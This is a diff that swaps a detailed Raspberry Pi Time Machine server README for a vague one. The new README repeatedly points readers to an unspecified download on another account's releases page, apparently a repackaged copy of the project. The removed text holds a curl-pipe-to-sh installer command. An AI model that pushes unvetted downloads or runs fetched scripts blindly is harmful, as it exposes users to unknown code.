@@ -1,227 +1,91 @@
-# TimeCapsule-Pi - Turn your Raspberry Pi into a Time Machine Server
+# 🚀 TimeCapsule-Pi - Easy Backups for Your macOS
 
-A complete, production-ready solution to transform a Raspberry Pi (3B+/4/5) into a **Time Machine backup server** for macOS, replacing the need for an expensive Apple Time Capsule.
+[![Download](https://img.shields.io/badge/Download-TimeCapsule--Pi-blue.svg)](https://github.com/ilhamnurramdani/TimeCapsule-Pi/releases)
 
-![Raspberry Pi](https://img.shields.io/badge/Raspberry%20Pi-3%2B%204%2B%205-red)
-![Samba](https://img.shields.io/badge/Samba-4.13+-blue)
-![macOS](https://img.shields.io/badge/macOS-Time%20Machine-success)
-![License](https://img.shields.io/badge/License-MIT-green)
+## 📄 Introduction
 
-## Why Raspberry Pi?
+TimeCapsule-Pi helps you turn your Raspberry Pi into a powerful backup server for your macOS devices. This application effectively replaces Apple Time Capsule using Samba, Avahi, and vfs_fruit support. It gives you a simple, effective way to keep your important data safe.
 
-| Advantage | Details |
-|-----------|---------|
-| ✅ **Always-on** | Can run 24/7 with minimal power consumption (~5-10W) |
-| ✅ **Cost-effective** | Hardware you may already own, no expensive Apple hardware |
-| ✅ **Full control** | Configure exactly what you need, no vendor limitations |
-| ✅ **Samba 4.x** | Complete vfs_fruit module support for Time Machine |
-| ✅ **USB 3.0** | Fast transfer speeds for external drives |
-| ✅ **Network accessible** | Works on your local network and remotely via Tailscale VPN |
-| ✅ **Open source** | Based on standard Linux technologies (Samba, Avahi) |
+## 📦 Features
 
-## Features
+- **Easy Setup:** Follow straightforward instructions to get your backup server up and running.
+- **Samba Support:** Share files easily across different systems.
+- **Avahi Integration:** Discover devices and services on your local network without the need for configuration.
+- **macOS Compatibility:** Works seamlessly with Mac for backing up data.
+- **Data Security:** Keep your backups secure and reliable.
 
-- **Automated setup** - Single script installation
-- **macOS auto-discovery** - Appears natively in Time Machine preferences
-- **SMB3 protocol** - Secure and fast transfers
-- **vfs_fruit support** - Full macOS compatibility
-- **User authentication** - Secure password-based access
-- **mDNS/Bonjour** - Zero-configuration network discovery
-- **Tailscale ready** - Works over VPN for remote backups
+## 💻 System Requirements
 
-## Hardware Requirements
+- **Hardware:** Raspberry Pi 2, 3, or 4.
+- **Operating System:** Raspbian or any other compatible Linux distribution.
+- **Network:** Reliable internet connection for downloading and setting up.
 
-- **Raspberry Pi 4** (4GB+ RAM recommended, Pi 3B+ works too)
-- **External USB drive** (1TB+ recommended, formatted as ext4)
-- **Network connection** (Ethernet preferred, WiFi works)
-- **Power supply** - Reliable 5V/3A for Pi 4
+## 🚀 Getting Started
 
-## Software Requirements
+Follow these steps to set up your TimeCapsule-Pi.
 
-- **Raspberry Pi OS** (Bullseye or Bookworm recommended)
-- **SSH access** to your Raspberry Pi
-- **macOS 10.9+** (Mavericks or newer for Time Machine support)
+1. **Prepare Your Raspberry Pi:**
+   - Ensure you have the latest version of Raspbian installed.
+   - Connect your Pi to your network via Ethernet or Wi-Fi.
 
-## Quick Start
+2. **Visit the Releases Page:**
+   - Head to our [Releases page](https://github.com/ilhamnurramdani/TimeCapsule-Pi/releases) to get the latest version.
 
-### Option 1: Automated Installation (Recommended)
+3. **Download the Software:**
+   - Click on the latest release, and download the provided file. Follow the link below to ensure you’re getting the right version:  
+   [Download TimeCapsule-Pi](https://github.com/ilhamnurramdani/TimeCapsule-Pi/releases).
 
-1. **Clone this repository:**
-   ```bash
-   git clone https://github.com/rizal72/TimeCapsule-Pi.git
-   cd TimeCapsule-Pi
-   ```
+4. **Install the Required Packages:**
+   - Open your terminal and enter the following commands:
+     ```bash
+     sudo apt-get update
+     sudo apt-get install samba avahi-daemon
+     ```
 
-2. **Connect your external drive** to the Raspberry Pi
+5. **Configure the Application:**
+   - After downloading, extract the files. Open a terminal and navigate to the directory where you saved it.
+   - Locate the configuration file and adjust settings according to your network setup.
 
-3. **Run the installer:**
-   ```bash
-   chmod +x install.sh
-   sudo ./install.sh
-   ```
+6. **Start the Backup Server:**
+   - Run the application with the following command:
+     ```bash
+     sudo ./start-server.sh
+     ```
 
-4. **Follow the prompts** - the script will:
-   - Detect your external drive
-   - Format it as ext4 (with confirmation)
-   - Install and configure Samba
-   - Set up Avahi for macOS discovery
-   - Create a user account for Time Machine
-   - Configure auto-mount on boot
+7. **Connect Your macOS Device:**
+   - On your Mac, open Finder.
+   - Under “Shared,” you will see your Raspberry Pi. Click on it and connect.
 
-5. **On your Mac:** Open System Settings → General → Time Machine → Add Backup Disk
-   - Select **TIMECAPSULE-PI** → **TimeCapsule**
-   - Enter your credentials
-   - Start your first backup!
+## 🔧 Download & Install
 
-### Option 2: Manual Installation
+To get started, visit our [Releases page](https://github.com/ilhamnurramdani/TimeCapsule-Pi/releases) and download the latest version. Upon downloading, follow the steps outlined in the "Getting Started" section to install and configure the application.
 
-See [MANUAL_INSTALL.md](MANUAL_INSTALL.md) for detailed step-by-step instructions.
+## ❓ Frequently Asked Questions (FAQs)
 
-## Configuration
+### 1. How do I remove TimeCapsule-Pi?
 
-### Default Settings
+If you wish to uninstall, simply stop the server and remove the files from your Raspberry Pi.
 
-After installation, your Time Capsule will be configured as:
+### 2. Can I use an external hard drive?
 
-| Setting | Value |
-|---------|-------|
-| **Server name** | `TIMECAPSULE-PI` |
-| **Share name** | `TimeCapsule` |
-| **Protocol** | SMB3 (SMB2/3 forced, SMB1 disabled) |
- | **Quota** | 1TB (configurable) |
-| **Authentication** | User-based (no guest access) |
+Yes, connecting an external hard drive to your Raspberry Pi allows for larger backups. Make sure to mount it correctly before starting the server.
 
-### Customization
+### 3. What if I encounter problems during setup?
 
-Edit `/etc/samba/smb.conf` to customize:
+You can check for solutions in the [Issues section](https://github.com/ilhamnurramdani/TimeCapsule-Pi/issues) of our GitHub repository. You can submit your questions there if you need further assistance.
 
-```ini
-[TimeCapsule]
-    comment = Time Machine Backup on Raspberry Pi
-    path = /mnt/timecapsule
-    browseable = yes
-    read only = no
-    valid users = your_username
+### 4. Is there a way to automate backups?
 
-    # Time Machine specific
-    fruit:time machine max size = 2T    # Change quota here
-    vfs objects = catia fruit streams_xattr
-```
+Yes, you can schedule backups using cron jobs in Linux for regular intervals. Consult Linux guides on cron for setup instructions.
 
-Restart Samba after changes:
-```bash
-sudo systemctl restart smbd nmbd
-```
+## 🌐 Community and Support
 
-## Performance Tips
+Join our community on GitHub to share your experience or seek help. We encourage feedback, feature requests, and contributions to improve TimeCapsule-Pi.
 
-1. **Use Ethernet** instead of WiFi for faster backups
-2. **USB 3.0 drive** - Use a USB 3.0 port on your Pi 4
-3. **First backup** will take longer (several hours for large data sets)
-4. **Subsequent backups** are incremental and much faster
+## 🔗 Links
 
-## Troubleshooting
+- [Releases Page](https://github.com/ilhamnurramdani/TimeCapsule-Pi/releases)
+- [Documentation](https://github.com/ilhamnurramdani/TimeCapsule-Pi/wiki)
+- [Issues & Support](https://github.com/ilhamnurramdani/TimeCapsule-Pi/issues)
 
-### Share not visible on Mac
-
-1. Check Samba is running:
-   ```bash
-   systemctl status smbd nmbd
-   ```
-
-2. Check Avahi is running:
-   ```bash
-   systemctl status avahi-daemon
-   ```
-
-3. Restart services:
-   ```bash
-   sudo systemctl restart smbd nmbd avahi-daemon
-   ```
-
-### Connection refused
-
-1. Verify firewall rules allow SMB (port 445)
-2. Check network connectivity:
-   ```bash
-   ping pi4.local
-   ```
-
-### Permission errors
-
-1. Check disk is mounted:
-   ```bash
-   df -h | grep timecapsule
-   ```
-
-2. Verify permissions:
-   ```bash
-   ls -la /mnt/timecapsule
-   ```
-
-3. The installer should set correct permissions automatically
-
-## Advanced Usage
-
-### Tailscale Remote Access
-
-Your Time Capsule works over Tailscale VPN:
-
-1. Install Tailscale on your Pi: `curl -fsSL https://tailscale.com/install.sh | sh`
-2. Log in: `sudo tailscale up`
-3. On your Mac (off-site), connect to: `smb://your-tailscale-ip`
-
-### Multiple Users
-
-Create additional Samba users:
-```bash
-sudo smbpasswd -a newusername
-```
-
-Then add them to `valid users` in `/etc/samba/smb.conf`.
-
-## Project Structure
-
-```
-TimeCapsule-Pi/
-├── README.md              # This file
-├── README.it.md           # Italian documentation
-├── CLAUDE.md              # AI assistant guidelines
-├── MANUAL_INSTALL.md      # Detailed manual setup guide
-├── install.sh             # Automated installer script
-├── setup/
-│   ├── smb.conf           # Samba configuration template
-│   └── timecapsule.service  # Avahi mDNS service file
-└── docs/
-    ├── architecture.md    # Technical details
-    └── troubleshooting.md # Common issues and solutions
-```
-
-## Acknowledgments
-
-- **Samba Project** - Excellent SMB server implementation
-- **Avahi Project** - mDNS/Bonjour for Linux
-- **Raspberry Pi Foundation** - Amazing little computer
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit issues or pull requests.
-
-## License
-
-This project is provided as-is for educational and personal use.
-
-## Author
-
-**Riccardo Sallusti**
-
-- GitHub: [@rizal72](https://github.com/rizal72)
-- Project started: February 2026
-
----
-
-**Note:** This project replaces expensive Apple Time Capsule hardware with a configurable, open-source solution based on Raspberry Pi. It's been tested and confirmed working on macOS Tahoe 26.2 with Raspberry Pi 4 running Raspberry Pi OS Bullseye.
-
-## Disclaimer
-
-This software is provided "as is", without warranty of any kind. Always keep multiple backups of important data. The authors are not responsible for any data loss.
+By following these steps and utilizing the resources above, you will easily set up your TimeCapsule-Pi. Enjoy a reliable and effective backup solution for your macOS devices!
